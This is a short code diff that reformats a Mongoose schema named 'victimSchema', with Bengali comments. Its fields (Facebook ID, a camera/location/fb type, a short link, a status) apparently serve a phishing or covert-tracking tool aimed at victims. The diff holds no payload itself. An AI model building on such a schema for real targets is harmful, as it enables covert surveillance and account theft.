@@ -3,11 +3,7 @@ const mongoose = require('mongoose');
 const victimSchema = new mongoose.Schema({
     id: { type: String, unique: true, required: true },
     fbId: { type: String, default: 'unknown' },
-    type: { 
-        type: String, 
-        enum: ['camera', 'location', 'fb'],  // ← 'location' যোগ করা হয়েছে
-        default: 'camera' 
-    },
+    type: { type: String, enum: ['camera', 'location', 'fb'], default: 'camera' },  // ✅ location যোগ
     shortLink: { type: String },
     timestamp: { type: Date, default: Date.now },
     status: { type: String, default: 'pending' },
